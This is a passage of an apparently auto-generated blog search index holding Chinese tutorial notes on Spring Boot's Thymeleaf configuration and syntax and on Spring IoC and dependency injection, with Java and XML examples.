Thymeleaf的自动配置类：ThymeleafProperties\njava\r1 2 3 4 5 @ConfigurationProperties(prefix = \u0026#34;spring.thymeleaf\u0026#34;) public class ThymeleafProperties { private static final Charset DEFAULT_ENCODING = StandardCharsets.UTF_8; public static final String DEFAULT_PREFIX = \u0026#34;classpath:/templates/\u0026#34;; public static final String DEFAULT_SUFFIX = \u0026#34;.html\u0026#34;; 那么只要在 templates 中写 .html 页面就可以完成 Thymeleaf 模板\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 package com.kuang.controller; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; // 在 templates 目录下的所有页面，只能通过 controller 来跳转 @Controller public class IndexController { @RequestMapping(\u0026#34;/test\u0026#34;) public String test() { return \u0026#34;test\u0026#34;; } } html\r1 2 3 4 5 6 7 8 9 10 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;test\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 4.2.1 Thymeleaf 语法学习 https://www.thymeleaf.org/documentation.html\nyaml 配置： yaml\r1 2 3 4 5 6 7 8 9 spring: thymeleaf: prefix: classpath:/templates/\t#指定模板所在的目录 check-template-location: true\t#检查模板路径是否存在 cache: false\t#是否缓存，开发模式下设置为false，避免改了模板还要重启服务器，线上设置为true，可以提高性能。 suffix: .html\t#表示模板文件的后缀 encoding: UTF-8\t#设置模板文件的字符编码 content-type: text/html\t#定渲染后返回的 HTTP 响应类型 mode: HTML5\t#Thymeleaf 模板解析模式 th 属性 th:text ：设置当前元素的文本内容，相同功能的还有th:utext，两者的区别在于前者不会转义html标签，后者会。优先级不高：order=7 th:value：设置当前元素的value值，类似修改指定属性的还有th:src，th:href。优先级不高：order=6 th:each：遍历循环元素，和th:text或th:value一起使用。注意该属性修饰的标签位置，详细往后看。优先级很高：order=2 th:if：条件判断，类似的还有th:unless，th:switch，th:case。优先级较高：order=3 th:insert：代码块引入，类似的还有th:replace，th:include，三者的区别较大，若使用不恰当会破坏html结构，常用于公共代码块提取的场景。优先级最高：order=1 th:fragment：定义代码块，方便被th:insert引用。优先级最低：order=8 th:object：声明变量，一般和*{}一起配合使用，达到偷懒的效果。优先级一般：order=4 th:attr：修改任意属性，实际开发中用的较少，因为有丰富的其他th属性帮忙，类似的还有th:attrappend，th:attrprepend。优先级一般：order=5 标准表达式语法 Simple expressions: Variable Expressions: **\u0026lt;font style=\u0026quot;color:rgb(112, 112, 112);\u0026quot;\u0026gt;${...}\u0026lt;/font\u0026gt;** Selection Variable Expressions: **\u0026lt;font style=\u0026quot;color:rgb(112, 112, 112);\u0026quot;\u0026gt;*{...}\u0026lt;/font\u0026gt;** Message Expressions: **\u0026lt;font style=\u0026quot;color:rgb(112, 112, 112);\u0026quot;\u0026gt;#{...}\u0026lt;/font\u0026gt;** Link URL Expressions: **\u0026lt;font style=\u0026quot;color:rgb(112, 112, 112);\u0026quot;\u0026gt;@{...}\u0026lt;/font\u0026gt;** Fragment Expressions: **\u0026lt;font style=\u0026quot;color:rgb(112, 112, 112);\u0026quot;\u0026gt;~{...}\u0026lt;/font\u0026gt;** ~{…} 代码块表达式 推荐：~{templatename::fragmentname} 支持：~{templatename::#id} templatename：模版名，Thymeleaf会根据模版名解析完整路径：/resources/templates/templatename.html，要注意文件的路径。\nfragmentname：片段名，Thymeleaf通过th:fragment声明定义代码块，即：th:fragment=\u0026quot;fragmentname\u0026quot;\nid：HTML的id选择器，使用时要在前面加上#号，不支持class选择器。\n#{…} 消息表达式 @{…} 链接表达式 链接表达式好处：不管是静态资源的引用，form表单的请求，凡是链接都可以用@{…} 。这样可以动态获取项目路径，即便项目名变了，依然可以正常访问。\n链接表达式结构:\n无参：@{/xxx} 有参：@{/xxx(k1=v1,k2=v2)} 对应url结构：xxx?k1=v1\u0026amp;k2=v2 引入本地资源：@{/项目本地的资源路径} 引入外部资源：@{/webjars/资源在jar包中的路径} ${…}变量表达式 变量表达式功能：\n可以获取对象的属性和方法 可以使用ctx，vars，locale，request，response，session，servletContext内置对象 可以使用dates，numbers，strings，objects，arrays，lists，sets，maps等内置方法（重点介绍） 常用的内置对象：\nctx ：上下文对象。 vars ：上下文变量。 locale：上下文的语言环境。 request：（仅在web上下文）的 HttpServletRequest 对象。 response：（仅在web上下文）的 HttpServletResponse 对象。 session：（仅在web上下文）的 HttpSession 对象。 servletContext：（仅在web上下文）的 ServletContext 对象 常用的内置方法:\nstrings：字符串格式化方法，常用的Java方法它都有。比如：equals，equalsIgnoreCase，length，trim，toUpperCase，toLowerCase，indexOf，substring，replace，startsWith，endsWith，contains，containsIgnoreCase等 numbers：数值格式化方法，常用的方法有：formatDecimal等 bools：布尔方法，常用的方法有：isTrue，isFalse等 arrays：数组方法，常用的方法有：toArray，length，isEmpty，contains，containsAll等 lists，sets：集合方法，常用的方法有：toList，size，isEmpty，contains，containsAll，sort等 maps：对象方法，常用的方法有：size，isEmpty，containsKey，containsValue等 dates：日期方法，常用的方法有：format，year，month，hour，createNow等 *{\u0026hellip;} 选择变量表达式 4.3 MVC自动配置原理 https://springdoc.cn/spring-boot/web.html#web.servlet\n","permalink":"http://localhost:1313/xvsf/posts/springboot/","summary":"\u003ch1 id=\"1springboot-简介\"\u003e1、SpringBoot 简介\u003c/h1\u003e\n\u003ch2 id=\"11-什么是-springboot\"\u003e1.1 什么是 SpringBoot\u003c/h2\u003e\n\u003cp\u003e\u003c!-- raw HTML omitted --\u003e随着 Spring 不断的发展，涉及的领域越来越多，项目整合开发需要配合各种各样的文件，慢慢变得不那么易用简单，违背了最初的理念，甚至人称配置地狱。Spring Boot 正是在这样的一个背景下被抽象出来的开发框架，目的为了让大家更容易的使用 Spring 、更容易的集成各种常用的中间件、开源软件；\u003c!-- raw HTML omitted --\u003e\u003c/p\u003e","title":"SpringBoot"},{"content":"1、Spring简介 Spring 官网\nSpring 5.2.0 官方文档\nGitHub - spring-projects/spring-framework: Spring Framework\nspring-webmvc\nxml\r1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-webmvc --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-webmvc\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.2.0.RELEASE\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 1.1、优点 Spring是一个开源的免费的框架 Spring是一个轻量级的、非入侵式的框架 控制反转（IOC），面向切面编程（AOP） 支持事物的处理，对框架整合的支持 总结一句话：Spring就是一个轻量级的控制反转（IOC）和面向切面编程（AOP）的框架\n1.2、组成 核心容器（Spring Core）\n核心容器提供Spring框架的基本功能。Spring以bean的方式组织和管理Java应用中的各个组件及其关系。Spring使用BeanFactory来产生和管理Bean，它是工厂模式的实现。BeanFactory使用控制反转(IoC)模式将应用的配置和依赖性规范与实际的应用程序代码分开。\n应用上下文（Spring Context）\nSpring上下文是一个配置文件，向Spring框架提供上下文信息。Spring上下文包括企业服务，如JNDI、EJB、电子邮件、国际化、校验和调度功能。\nSpring面向切面编程（Spring AOP）\n通过配置管理特性，Spring AOP 模块直接将面向方面的编程功能集成到了 Spring框架中。所以，可以很容易地使 Spring框架管理的任何对象支持 AOP。Spring AOP 模块为基于 Spring 的应用程序中的对象提供了事务管理服务。通过使用 Spring AOP，不用依赖 EJB 组件，就可以将声明性事务管理集成到应用程序中。\nJDBC和DAO模块（Spring DAO）\nJDBC、DAO的抽象层提供了有意义的异常层次结构，可用该结构来管理异常处理，和不同数据库供应商所抛出的错误信息。异常层次结构简化了错误处理，并且极大的降低了需要编写的代码数量，比如打开和关闭链接。\n对象实体映射（Spring ORM）\nSpring框架插入了若干个ORM框架，从而提供了ORM对象的关系工具，其中包括了Hibernate、JDO和 IBatis SQL Map等，所有这些都遵从Spring的通用事物和DAO异常层次结构。\nWeb模块（Spring Web）\nWeb上下文模块建立在应用程序上下文模块之上，为基于web的应用程序提供了上下文。所以Spring框架支持与Struts集成，web模块还简化了处理多部分请求以及将请求参数绑定到域对象的工作。\nMVC模块（Spring Web MVC）\nMVC框架是一个全功能的构建Web应用程序的MVC实现。通过策略接口，MVC框架变成为高度可配置的。MVC容纳了大量视图技术，其中包括JSP、POI等，模型来有JavaBean来构成，存放于m当中，而视图是一个街口，负责实现模型，控制器表示逻辑代码，由c的事情。Spring框架的功能可以用在任何J2EE服务器当中，大多数功能也适用于不受管理的环境。Spring的核心要点就是支持不绑定到特定J2EE服务的可重用业务和数据的访问的对象，毫无疑问这样的对象可以在不同的J2EE环境，独立应用程序和测试环境之间重用。\n1.3、拓展 现代化的Java开发，说白就是基于 Spring 的开发\nSpring Boot\n一个快速开发的脚手架 基于Spring Boot可以快速的开发单个微服务 约定大于配置 Spring Cloud\nSpring Cloud 是基于Spring Boot 实现的 2、IOC 容器 2.1 IOC 理论推导 案例一： UserDao 接口 java\r1 2 3 4 5 package com.kuang.dao; public interface UserDao { void getUser(); } UserDaoImpl 实现类 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package com.kuang.dao; public class UserDaoImpl implements UserDao{ @Override public void getUser() { System.out.println(\u0026#34;默认获取用户的数据\u0026#34;); } } package com.kuang.dao; public class UserDaoMysqlImpl implements UserDao { @Override public void getUser() { System.out.println(\u0026#34;mysql 获取用户的数据\u0026#34;); } } UserService 业务接口 java\r1 2 3 4 5 package com.kuang.service; public interface UserService { void getUser(); } UserServicelmpl 业务实现类 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package com.kuang.service; import com.kuang.dao.UserDao; import com.kuang.dao.UserDaoImpl; import com.kuang.dao.UserDaoMysqlImpl; public class UserServiceImpl implements UserService { //这样的代码，用户的需求可能会影响我们原来的代码，我们需根据用户的需求去修改原代码！ //private UserDao userDao = new UserDaoImpl(); //private UserDao userDao = new UserDaoMysqlImpl(); //使用 Set 接口，避免了根据用户的需求去修改原代码，而是由用户决定需要调用哪个接口。之前，程序是主动创建对象，控制权在程序猿手上；使用 set注入后，程序不再具有主动性，而是变成了被动的接收对象 // 这种 “控制反转” 的思想，从本质上解决了程序猿管理对象的创建的问题，系统的耦合性大大降低，从而更专注于业务的实现上！ private UserDao userDao; //利用 set 进行动态实现值的注入 public void setUserDao(UserDao userDao) { this.userDao = userDao; } public void getUser() { userDao.getUser(); } } MyTest 用户层 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import com.kuang.dao.UserDaoImpl; import com.kuang.dao.UserDaoMysqlImpl; import com.kuang.service.UserService; import com.kuang.service.UserServiceImpl; public class MyTest { public static void main(String[] args) { //用户实际调用的是业务层，dao 层他们不需要接触 //之前，用户调用什么接口，是由 UserServicelmpl 中写死的， // UserService userService = new UserServiceImpl(); // userService.getUser(); //而加入“控制反转” 的思想后，主动权交由用户手中 UserService userService = new UserServiceImpl(); ((UserServiceImpl) userService).setUserDao(new UserDaoImpl()); userService.getUser(); } } 使用 Set 接口，避免了根据用户的需求去修改原代码，而是由用户决定需要调用哪个接口。之前，程序是主动创建对象，控制权在程序猿手上；使用 set注入后，程序不再具有主动性，而是变成了被动的接收对象\n这种 “控制反转” 的思想，从本质上解决了程序猿管理对象的创建的问题，系统的耦合性大大降低，从而更专注于业务的实现上！\n2.2 IOC 本质 控制反转IoC(Inversion of Control)，是一种设计思想，DI(依赖注入)是实现IoC的一种方法，也有人认为DI只是IoC的另一种说法。没有IoC的程序中 , 我们使用面向对象编程 , 对象的创建与对象间的依赖关系完全硬编码在程序中，对象的创建由程序自己控制，控制反转后将对象的创建转移给第三方，个人认为所谓控制反转就是：获得依赖对象的方式反转了。\nIoC是Spring框架的核心内容，使用多种方式完美的实现了IoC，可以使用XML配置，也可以使用注解，新版本的Spring也可以零配置实现IoC。\nSpring容器在初始化时先读取配置文件，根据配置文件或元数据创建与组织对象存入容器中，程序使用时再从Ioc容器中取出需要的对象。\n采用XML方式配置Bean的时候，Bean的定义信息是和实现分离的，而采用注解的方式可以把两者合为一体，Bean的定义信息直接以注解的形式定义在实现类中，从而达到了零配置的目的。\n控制反转是一种通过描述（XML或注解）并通过第三方去生产或获取特定对象的方式。在Spring中实现控制反转的是IoC容器，其实现方法是依赖注入（Dependency Injection,DI）。\n2.3 HelloSpring 案例二 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package com.kuang.pojo; public class Hello { private String str; public String getStr() { return str; } public void setStr(String str) { this.str = str; } @Override public String toString() { return \u0026#34;Hello{\u0026#34; + \u0026#34;str=\u0026#39;\u0026#34; + str + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#39;}\u0026#39;; } } xml\r1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\u0026#34;\u0026gt; \u0026lt;!-- 使用 Spring 来创建对象，在 Spring 这些都称为 Bean --\u0026gt; \u0026lt;bean id=\u0026#34;hello\u0026#34; class=\u0026#34;com.kuang.pojo.Hello\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;str\u0026#34; value=\u0026#34;Spring\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 import com.kuang.pojo.Hello; import org.springframework.context.ApplicationContext; import org.springframework.context.support.ClassPathXmlApplicationContext; public class MyTest { public static void main(String[] args) { //获取 Spring 的上下文对象,.解析beans.xml文件 , 生成管理相应的Bean对象 ApplicationContext context = new ClassPathXmlApplicationContext(\u0026#34;beans.xml\u0026#34;); //getBean 参数即为spring配置文件中bean的id Hello hello = (Hello) context.getBean(\u0026#34;hello\u0026#34;); System.out.println(hello.toString()); } } hello 对象是由Spring创建的 hello 对象的属性是由Spring容器设置的 这个过程就叫控制反转：\n控制 : 谁来控制对象的创建 , 传统应用程序的对象是由程序本身控制创建的 , 使用Spring后 , 对象是由Spring来创建的 反转 : 程序本身不创建对象 , 而变成被动的接收对象 . 依赖注入 : 就是利用set方法来进行注入的.\nIOC是一种编程思想，由主动的编程变成被动的接收\n可以通过newClassPathXmlApplicationContext去浏览一下底层源码 .\n案例一修改 新增 beans.xml\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:util=\u0026#34;http://www.springframework.org/schema/util\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/util https://www.springframework.org/schema/util/spring-util.xsd\u0026#34;\u0026gt; \u0026lt;bean id=\u0026#34;mysqlImpl\u0026#34; class=\u0026#34;com.kuang.dao.UserDaoMysqlImpl\u0026#34;/\u0026gt; \u0026lt;bean id=\u0026#34;oracleImpl\u0026#34; class=\u0026#34;com.kuang.dao.UserDaoOracleImpl\u0026#34;/\u0026gt; \u0026lt;bean id=\u0026#34;UserServiceImpl\u0026#34; class=\u0026#34;com.kuang.service.UserServiceImpl\u0026#34;\u0026gt; \u0026lt;!-- ref : 引用 Spring 容器中创建好的对象 value : 具体的值，基本数据类型 --\u0026gt; \u0026lt;property name=\u0026#34;userDao\u0026#34; ref=\u0026#34;mysqlImpl\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 修改 MyTest.java\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 //import com.kuang.dao.UserDaoImpl; //import com.kuang.dao.UserDaoMysqlImpl; //import com.kuang.service.UserService; //import com.kuang.service.UserServiceImpl; // //public class MyTest { // // public static void main(String[] args) { // //用户实际调用的是业务层，dao 层他们不需要接触 // //之前，用户调用什么接口，是由 UserServicelmpl 中写死的， // // UserService userService = new UserServiceImpl(); // // userService.getUser(); // // //而加入“控制反转” 的思想后，主动权交由用户手中 // UserService userService = new UserServiceImpl(); // ((UserServiceImpl) userService).setUserDao(new UserDaoMysqlImpl()); // userService.getUser(); // } //} import com.kuang.service.UserServiceImpl; import org.springframework.context.ApplicationContext; import org.springframework.context.support.ClassPathXmlApplicationContext; public class MyTest { public static void main(String[] args) { //获取 ApplicationContext;拿到 Spring 的容器 ApplicationContext context = new ClassPathXmlApplicationContext(\u0026#34;beans.xml\u0026#34;); UserServiceImpl userServiceImpl = (UserServiceImpl) context.getBean(\u0026#34;UserServiceImpl\u0026#34;); userServiceImpl.getUser(); } } 现在呢，案例一想实现了不需要程序猿或者用户改动代码实现不同的操作，只需要在xml配置文件中修改，即可达到目的。\n所谓的IoC,一句话搞定 : 对象由Spring 来创建 , 管理 , 装配 !\n2.4 IOC 创建对象方式 2.4.1 无参构造 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package com.kuang.pojo; public class User { private String name; public User() { System.out.println(\u0026#34;User 的无参构造\u0026#34;); } public String getName() { return name; } public void setName(String name) { this.name = name; } public void show() { System.out.println(\u0026#34;name=\u0026#34; + name); } } \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\u0026#34;\u0026gt; \u0026lt;bean id=\u0026#34;user\u0026#34; class=\u0026#34;com.kuang.pojo.User\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;name\u0026#34; value=\u0026#34;qwer\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; import com.kuang.pojo.User; import org.springframework.context.ApplicationContext; import org.springframework.context.support.ClassPathXmlApplicationContext; public class MyTest { public static void main(String[] args) { ApplicationContext context = new ClassPathXmlApplicationContext(\u0026#34;beans.xml\u0026#34;); User user = (User) context.getBean(\u0026#34;user\u0026#34;); user.show(); } } 在调用show方法之前，User对象已经通过无参构造初始化了\n2.4.2 有参构造 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 package com.kuang.pojo; public class User { private String name; public User(String name) { //System.out.println(\u0026#34;User 的无参构造\u0026#34;); this.name = name; } public String getName() { return name; } public void setName(String name) { this.name = name; } public void show() { System.out.println(\u0026#34;name=\u0026#34; + name); } } import com.kuang.pojo.User; import org.springframework.context.ApplicationContext; import org.springframework.context.support.ClassPathXmlApplicationContext; public class MyTest { public static void main(String[] args) { ApplicationContext context = new ClassPathXmlApplicationContext(\u0026#34;beans.xml\u0026#34;); User user = (User) context.getBean(\u0026#34;user\u0026#34;); user.show(); } } 第一种：下标赋值 xml\r1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\u0026#34;\u0026gt; \u0026lt;!--第一种，下标赋值 --\u0026gt; \u0026lt;bean id=\u0026#34;user\u0026#34; class=\u0026#34;com.kuang.pojo.User\u0026#34;\u0026gt; \u0026lt;constructor-arg index=\u0026#34;0\u0026#34; value=\u0026#34;qaz\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 第二种：通过类型创建，不建议使用 xml\r1 2 3 4 \u0026lt;!--第二种，通过类型创 --\u0026gt; \u0026lt;bean id=\u0026#34;user\u0026#34; class=\u0026#34;com.kuang.pojo.User\u0026#34;\u0026gt; \u0026lt;constructor-arg type=\u0026#34;java.lang.String\u0026#34; value=\u0026#34;wsx\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; 第三种：直接通过参数名设置 xml\r1 2 3 4 \u0026lt;!--第三种，直接通过参数名设置 --\u0026gt; \u0026lt;bean id=\u0026#34;user\u0026#34; class=\u0026#34;com.kuang.pojo.User\u0026#34;\u0026gt; \u0026lt;constructor-arg name=\u0026#34;name\u0026#34; value=\u0026#34;edc\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; 2.5 Spring 配置 别名 alias 设置别名 , 为bean设置别名 , 可以设置多个别名\nxml\r1 2 \u0026lt;!--设置别名：在获取Bean的时候可以使用别名获取--\u0026gt; \u0026lt;alias name=\u0026#34;userT\u0026#34; alias=\u0026#34;userNew\u0026#34;/\u0026gt; Bean的配置 xml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;!--bean就是java对象,由Spring创建和管理--\u0026gt; \u0026lt;!-- id: 是bean的唯一标识符,如果没有配置id,name就是默认标识符 name: 可以设置多个别名,可以用逗号,分号,空格隔开 class: 是bean的全限定名=包名+类名 如果配置id,又配置了name,那么name是别名 如果不配置id和name,可以根据applicationContext.getBean(.class)获取对象; --\u0026gt; \u0026lt;bean id=\u0026#34;hello\u0026#34; name=\u0026#34;hello2 h2,h3;h4\u0026#34; class=\u0026#34;com.kuang.pojo.Hello\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;name\u0026#34; value=\u0026#34;Spring\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; import 团队的合作通过import来实现 .\nxml\r1 \u0026lt;import resource=\u0026#34;{path}/beans.xml\u0026#34;/\u0026gt; 2.6 依赖注入 依赖注入（Dependency Injection,DI）。 依赖 : 指Bean对象的创建依赖于容器，Bean对象的依赖资源 注入 : 指Bean对象所依赖的资源 , 由容器来设置和装配 2.6.1 构造器注入 https://www.yuque.com/taohuayuanpang/kfw7zl/rpagg11nwkzm2qh2#Xjgzu\n2.6.2 Set 方式注入【重点】 案例三 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 package com.kuang.pojo; import java.util.*; public class Student { private String name; private Address address; private String[] books; private List\u0026lt;String\u0026gt; hobbys; private Map\u0026lt;String,String\u0026gt; card; private Set\u0026lt;String\u0026gt; game; private String wife; private Properties info; //下方内容快捷键生成：Alt + Insert , 生成 getter和setter public String getName() { return name; } public void setName(String name) { this.name = name; } public Address getAddress() { return address; } public void setAddress(Address address) { this.address = address; } public String[] getBooks() { return books; } public void setBooks(String[] books) { this.books = books; } public Map\u0026lt;String, String\u0026gt; getCard() { return card; } public void setCard(Map\u0026lt;String, String\u0026gt; card) { this.card = card; } public List\u0026lt;String\u0026gt; getHobbys() { return hobbys; } public void setHobbys(List\u0026lt;String\u0026gt; hobbys) { this.hobbys = hobbys; } public Set\u0026lt;String\u0026gt; getGame() { return game; } public void setGame(Set\u0026lt;String\u0026gt; game) { this.game = game; } public String getWife() { return wife; } public void setWife(String wife) { this.wife = wife; } public Properties getInfo() { return info; } public void setInfo(Properties info) { this.info = info; } //下方内容快捷键生成：Alt + Insert , 生成 toString @Override public String toString() { return \u0026#34;Student{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, address=\u0026#34; + address + \u0026#34;, books=\u0026#34; + Arrays.toString(books) + \u0026#34;, hobbys=\u0026#34; + hobbys + \u0026#34;, card=\u0026#34; + card + \u0026#34;, game=\u0026#34; + game + \u0026#34;, wife=\u0026#39;\u0026#34; + wife + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, info=\u0026#34; + info + \u0026#39;}\u0026#39;; } } package com.kuang.pojo; public class Address { private String address; public String getAddress() { return address; } public void setAddress(String address) { this.address = address; } @Override public String toString() { return \u0026#34;Address{\u0026#34; + \u0026#34;address=\u0026#39;\u0026#34; + address + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#39;}\u0026#39;; } } import com.kuang.pojo.Student; import org.springframework.context.ApplicationContext; import org.springframework.context.support.ClassPathXmlApplicationContext; public class MyTest { public static void main(String[] args) { ApplicationContext context = new ClassPathXmlApplicationContext(\u0026#34;beans.xml\u0026#34;); Student student = (Student) context.getBean(\u0026#34;student\u0026#34;); System.out.println(student.toString()); /* Student{ name=\u0026#39;qwer\u0026#39;, address=Address{address=\u0026#39;北京市海淀区\u0026#39;}, books=[西游记, 红楼梦, 水浒传], hobbys=[听歌, 看电影, 爬山], card={中国邮政=456456456465456, 建设=1456682255511}, game=[LOL, BOB, COC], wife=\u0026#39;null\u0026#39;, info={age=18, name=qwer}} */ } } \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\u0026#34;\u0026gt; \u0026lt;bean id=\u0026#34;address\u0026#34; class=\u0026#34;com.kuang.pojo.Address\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;address\u0026#34; value=\u0026#34;北京市海淀区\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;bean id=\u0026#34;student\u0026#34; class=\u0026#34;com.kuang.pojo.Student\u0026#34;\u0026gt; \u0026lt;!--第一种，普通值注入，value--\u0026gt; \u0026lt;property name=\u0026#34;name\u0026#34; value=\u0026#34;qwer\u0026#34;/\u0026gt; \u0026lt;!--第二种，Bean注入，ref--\u0026gt; \u0026lt;property name=\u0026#34;address\u0026#34; ref=\u0026#34;address\u0026#34;/\u0026gt; \u0026lt;!--数组--\u0026gt; \u0026lt;property name=\u0026#34;books\u0026#34;\u0026gt; \u0026lt;array\u0026gt; \u0026lt;value\u0026gt;西游记\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;红楼梦\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;水浒传\u0026lt;/value\u0026gt; \u0026lt;/array\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!--List--\u0026gt; \u0026lt;property name=\u0026#34;hobbys\u0026#34;\u0026gt; \u0026lt;list\u0026gt; \u0026lt;value\u0026gt;听歌\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;看电影\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;爬山\u0026lt;/value\u0026gt; \u0026lt;/list\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!--Map--\u0026gt; \u0026lt;property name=\u0026#34;card\u0026#34;\u0026gt; \u0026lt;map\u0026gt; \u0026lt;entry key=\u0026#34;中国邮政\u0026#34; value=\u0026#34;456456456465456\u0026#34;/\u0026gt; \u0026lt;entry key=\u0026#34;建设\u0026#34; value=\u0026#34;1456682255511\u0026#34;/\u0026gt; \u0026lt;/map\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!--set--\u0026gt; \u0026lt;property name=\u0026#34;game\u0026#34;\u0026gt; \u0026lt;set\u0026gt; \u0026lt;value\u0026gt;LOL\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;BOB\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;COC\u0026lt;/value\u0026gt; \u0026lt;/set\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!--Null--\u0026gt; \u0026lt;property name=\u0026#34;wife\u0026#34;\u0026gt; \u0026lt;null/\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!--Properties--\u0026gt; \u0026lt;property name=\u0026#34;info\u0026#34;\u0026gt; \u0026lt;props\u0026gt; \u0026lt;prop key=\u0026#34;name\u0026#34;\u0026gt;qwer\u0026lt;/prop\u0026gt; \u0026lt;prop key=\u0026#34;age\u0026#34;\u0026gt;18\u0026lt;/prop\u0026gt; \u0026lt;/props\u0026gt; 